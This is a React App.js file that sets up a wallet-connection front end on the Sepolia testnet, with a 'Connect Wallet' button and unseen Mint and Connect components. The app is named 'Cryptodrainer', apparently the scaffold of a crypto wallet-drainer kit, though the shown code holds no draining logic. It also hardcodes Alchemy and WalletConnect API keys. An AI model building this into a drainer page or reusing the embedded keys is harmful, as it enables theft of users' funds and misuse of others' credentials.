import './App.css';
import { WagmiConfig, createConfig, sepolia } from 'wagmi';
import { ConnectKitProvider, getDefaultConfig } from 'connectkit';
import Mint from './components/Mint';
import Connect from './components/Connect';
import { ConnectKitButton } from 'connectkit';

const config = createConfig(getDefaultConfig ({
  alchemyId: "gQBIeDKq12YYwxMtLUdvRMKuZACNtyTg",
  walletConnectProjectId: "5c4efd9f314b13050f04f5fa2c7a46e7",
  chains: [sepolia],
  appName: "Cryptodrainer",
  appUrl: "https://demo.cryptodrainer.com",
  appIcon:"https://i0.wp.com/cryptodrainers.com/wp-content/uploads/2023/03/cropped-cryptodrainer.png"
}));

function App() {

  return (
    <div className='centered-box'>
    <WagmiConfig config={config}>
      <ConnectKitProvider theme='auto' mode='dark'>
        <div> <ConnectKitButton.Custom>
            {({ isConnected, show, truncatedAddress}) => {
                return (
                    <button onClick={ show }>
                        { isConnected ? truncatedAddress : "Connect Wallet" }
                    </button>
                )
            }}
        </ConnectKitButton.Custom> </div>
        <div> <Mint/> </div>
        <div> <Connect/> </div>
      </ConnectKitProvider>
    </WagmiConfig>
    </div>
  )
}

export default App;